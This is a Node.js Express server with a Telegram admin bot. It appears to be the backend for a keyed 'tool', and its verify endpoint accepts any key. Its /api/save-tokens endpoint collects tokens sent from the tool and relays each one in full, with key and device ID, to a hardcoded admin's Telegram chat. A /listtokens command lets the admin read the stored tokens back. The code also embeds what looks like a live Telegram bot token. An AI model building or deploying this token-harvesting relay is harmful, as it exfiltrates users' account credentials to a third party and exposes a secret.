const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

const app = express();

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
}));

app.use(express.json());

// CẤU HÌNH BÀI VIẾT TELEGRAM
const TELEGRAM_TOKEN = "8824683894:AAFup6ikP7V1nvu5QJhnDcmD9A3RyQT8_rs";
const ADMIN_ID = 8377928865;

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// LẮP BỘ BẮT LỖI POLLING (Để phát hiện ngay nếu bị đụng Token/Lỗi mạng)
bot.on('polling_error', (error) => {
    console.error("⚠️ [LỖI BOT TELEGRAM]:", error.code, error.message);
});

// Khai báo biến lưu trữ tạm thời
let globalTokens = [];
let isMaintenanceMode = false;
let maintenanceMsg = "HỆ THỐNG ĐANG BẢO TRÌ ĐỂ CẬP NHẬT!\nVUI LÒNG QUAY LẠI SAU ÍT PHÚT.";

let currentNotice = {
    active: false,
    id: "notice_v1",
    title: "📢 THÔNG BÁO TỪ HỆ THỐNG",
    message: ""
};

// ----------------------------------------------------
// API ENDPOINTS
// ----------------------------------------------------
app.get('/api/status', (req, res) => {
    return res.json({
        isMaintenance: isMaintenanceMode,
        message: maintenanceMsg,
        notice: currentNotice
    });
});

app.get('/api/verify', (req, res) => {
    const { key, deviceId } = req.query;

    if (isMaintenanceMode) {
        return res.json({ success: false, isMaintenance: true, message: maintenanceMsg });
    }

    if (!key) {
        return res.json({ success: false, message: "Vui lòng nhập Key!" });
    }

    const expireAt = Date.now() + (24 * 60 * 60 * 1000);

    return res.json({
        success: true,
        isMaintenance: false,
        key: key,
        deviceId: deviceId,
        expireAt: expireAt,
        message: "Xác thực Key thành công!"
    });
});

app.post('/api/save-tokens', async (req, res) => {
    try {
        const { key, deviceId, tokens } = req.body;

        if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
            return res.status(400).json({ success: false, message: "Không tìm thấy token nào!" });
        }

        const validTokens = tokens.map(t => t.trim()).filter(t => t !== "");

        if (validTokens.length === 0) {
            return res.status(400).json({ success: false, message: "Danh sách Token rỗng!" });
        }

        globalTokens = validTokens;

        let msg = `📥 <b>NHẬN TOKEN MỚI TỪ TOOL</b>\n`;
        msg += `🔑 Key: <code>${key || 'Không có'}</code>\n`;
        msg += `📱 HWID: <code>${deviceId || 'Không có'}</code>\n`;
        msg += `📊 Số lượng: <b>${validTokens.length} Token</b>\n\n`;
        msg += `📋 <b>Danh sách Token:</b>\n`;

        validTokens.forEach((tk, idx) => {
            msg += `${idx + 1}. <code>${tk}</code>\n`;
        });

        await bot.sendMessage(ADMIN_ID, msg, { parse_mode: 'HTML' });

        return res.json({ success: true, message: "Đã lưu và gửi Token thành công!" });

    } catch (error) {
        console.error("Lỗi xử lý /api/save-tokens:", error);
        return res.status(500).json({ success: false, message: "Lỗi Server nội bộ!" });
    }
});

// ----------------------------------------------------
// BOT TELEGRAM COMMANDS (BỘ XỬ LÝ LỆNH TẬP TRUNG)
// ----------------------------------------------------

bot.on('message', async (msg) => {
    if (!msg.text) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text.trim();

    // LOG RA CONSOLE ĐỂ BẠN THEO DÕI TRÊN SERVER
    console.log(`📩 [TIN NHẮN ĐẾN] Từ ID: ${userId} | Nội dung: "${text}"`);

    // Kiểm tra quyền Admin
    if (String(userId) !== String(ADMIN_ID)) {
        console.log(`⛔ Khai trừ ID ${userId} do không trùng với ADMIN_ID (${ADMIN_ID})`);
        return;
    }

    // Lệnh: /start hoặc /help
    if (text === '/start' || text === '/help') {
        let helpText = `🤖 <b>BẢNG ĐIỀU KHIỂN BOT ADMIN SENKOO</b>\n\n`;
        helpText += `🔹 <b>/listtokens</b> : Xem danh sách Token\n`;
        helpText += `🔹 <b>/baotri on</b> : Bật bảo trì\n`;
        helpText += `🔹 <b>/baotri off</b> : Tắt bảo trì\n`;
        helpText += `🔹 <b>/thongbao [Nội dung]</b> : Bật Popup thông báo trên Tool\n`;
        helpText += `🔹 <b>/tatthongbao</b> : Tắt Popup thông báo\n`;
        return bot.sendMessage(chatId, helpText, { parse_mode: 'HTML' });
    }

    // Lệnh: /listtokens
    if (text === '/listtokens') {
        if (globalTokens.length === 0) {
            return bot.sendMessage(chatId, "⚠️ Hiện chưa có Token nào trong hệ thống.");
        }
        let listText = `📋 <b>DANH SÁCH TOKEN HIỆN CÓ (${globalTokens.length}):</b>\n\n`;
        globalTokens.forEach((tk, i) => {
            listText += `${i + 1}. <code>${tk}</code>\n`;
        });
        return bot.sendMessage(chatId, listText, { parse_mode: 'HTML' });
    }

    // Lệnh: /baotri on hoặc /baotri off
    if (text.startsWith('/baotri')) {
        const action = text.replace('/baotri', '').trim().toLowerCase();
        if (action === 'on') {
            isMaintenanceMode = true;
            return bot.sendMessage(chatId, "🔒 Đã <b>BẬT</b> chế độ bảo trì. Tool đã bị khóa!", { parse_mode: 'HTML' });
        } else if (action === 'off') {
            isMaintenanceMode = false;
            return bot.sendMessage(chatId, "🔓 Đã <b>TẮT</b> chế độ bảo trì. Tool hoạt động bình thường!", { parse_mode: 'HTML' });
        } else {
            return bot.sendMessage(chatId, "⚠️ Cú pháp sai! Dùng: <code>/baotri on</code> hoặc <code>/baotri off</code>", { parse_mode: 'HTML' });
        }
    }

    // Lệnh: /thongbao [Nội dung]
    if (text.startsWith('/thongbao')) {
        const noticeContent = text.replace('/thongbao', '').trim();

        if (!noticeContent) {
            return bot.sendMessage(chatId, "⚠️ <b>Thiếu nội dung thông báo!</b>\n\n👉 Cú pháp đúng: <code>/thongbao Nội dung cần gửi</code>", { parse_mode: 'HTML' });
        }

        currentNotice = {
            active: true,
            id: "notice_" + Date.now(),
            title: "📢 THÔNG BÁO TỪ HỆ THỐNG",
            message: noticeContent
        };

        return bot.sendMessage(chatId, `✅ <b>Đã bật thông báo mới lên Tool:</b>\n\n💬 ${noticeContent}`, { parse_mode: 'HTML' });
    }

    // Lệnh: /tatthongbao
    if (text === '/tatthongbao') {
        currentNotice.active = false;
        return bot.sendMessage(chatId, "❌ Đã <b>TẮT</b> thông báo Popup trên Tool!", { parse_mode: 'HTML' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`=================================`);
    console.log(`Server đang chạy tại Cổng ${PORT}`);
    console.log(`ADMIN_ID đang cấu hình là: ${ADMIN_ID}`);
    console.log(`=================================`);
});
